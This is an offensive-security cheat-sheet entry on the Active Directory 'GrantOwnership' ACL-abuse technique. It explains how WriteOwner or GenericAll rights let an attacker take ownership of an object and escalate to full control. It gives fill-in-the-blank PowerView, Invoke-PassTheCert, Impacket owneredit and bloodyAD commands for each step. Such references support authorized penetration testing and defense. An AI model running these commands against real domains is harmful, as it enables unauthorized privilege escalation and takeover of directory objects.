---
technique: GrantOwnership
category: acl-abuse
ace: WriteOwner, GenericAll
targets: User, Group, Computer, Domain, OU
protocols: LDAP, LDAPS
remote_capable: true
tags: acl-abuse dacl ad writeowner ownership ldap
---

# GrantOwnership

When a controlled object holds `WriteOwner` or `GenericAll` over another object, the attacker can reassign ownership of that object to a principal they control. Owning an object implicitly grants `WriteDacl`, which allows the new owner to rewrite the object's DACL and escalate to full control. This technique is commonly chained with `GrantRights` to obtain `GenericAll` after taking ownership.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| WriteOwner | Permission to change the owner field in the object's security descriptor |
| GenericAll | Full control of the object, implicitly includes WriteOwner |

## Windows

PowerView and Invoke-PassTheCert both support ownership changes.

### Set-DomainObjectOwner

#powershell #powerview

Change the owner of an AD object to a controlled principal using PowerView.

```powershell title:"Change object owner via PowerView"
Set-DomainObjectOwner -Identity "$target_object" -OwnerIdentity "$controlled_principal"
```
<!-- cheat
var target_object
var controlled_principal
-->

### Step 1: Import module (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Change object owner over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Change the owner of an AD object over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Change object owner over LDAPS using certificate"
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'Owner' -OwnerSID "$controlled_principal_sid" -Target "$target_object_dn"
```
<!-- cheat
var controlled_principal_sid
var target_object_dn
-->

## Linux

Impacket's owneredit and bloodyAD write the new owner directly over LDAP.

### owneredit

#ldap #password #impacket

Reassign ownership of an AD object to a controlled principal using Impacket's owneredit.

```sh title:"Change object owner via owneredit"
owneredit.py -action write -new-owner "$controlled_object" -target "$target_object" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_object
-->

### bloodyAD

#ldap #multi-auth

Reassign ownership of an AD object to a controlled principal using bloodyAD.

```sh title:"Change object owner via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set owner "$target_object" "$controlled_object"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_object
var controlled_object
-->
